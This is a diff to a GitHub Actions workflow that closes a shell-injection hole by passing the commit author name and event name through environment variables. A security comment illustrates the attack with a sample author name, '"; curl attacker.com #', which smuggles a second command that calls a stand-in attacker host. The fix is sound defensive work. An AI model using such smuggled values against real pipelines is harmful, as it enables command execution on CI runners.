@@ -83,17 +83,26 @@ jobs:
           # would only grab HEAD, making `git diff HEAD^ HEAD` fail.
           fetch-depth: 2
       - id: detect
+        env:
+          # SECURITY: pass user-controlled values via env, NEVER interpolate
+          # them directly with ${{ … }} in a `run:` shell block. A commit
+          # author name like `"; curl attacker.com #` would otherwise be
+          # injected verbatim into the script (Devin Review #165 finding).
+          # The `if:` expressions on downstream jobs evaluate this value as
+          # a GitHub-Actions expression (not shell), so they're safe — but
+          # this `run:` step is shell, hence the env-var indirection.
+          COMMIT_AUTHOR: ${{ github.event.head_commit.author.name }}
+          EVENT_NAME: ${{ github.event_name }}
         run: |
           set -euo pipefail
-          author="${{ github.event.head_commit.author.name }}"
-          if [[ "$author" == "gpt-engineer-app[bot]" ]]; then
+          if [[ "$COMMIT_AUTHOR" == "gpt-engineer-app[bot]" ]]; then
             echo "is_lovable=true" >> "$GITHUB_OUTPUT"
           else
             echo "is_lovable=false" >> "$GITHUB_OUTPUT"
           fi
           # For non-push events the carve-out is moot — those jobs gate on
           # `github.event_name != 'push'` directly and never consult sync_critical.
-          if [[ "${{ github.event_name }}" != "push" ]]; then
+          if [[ "$EVENT_NAME" != "push" ]]; then
             echo "sync_critical=false" >> "$GITHUB_OUTPUT"
             exit 0
           fi
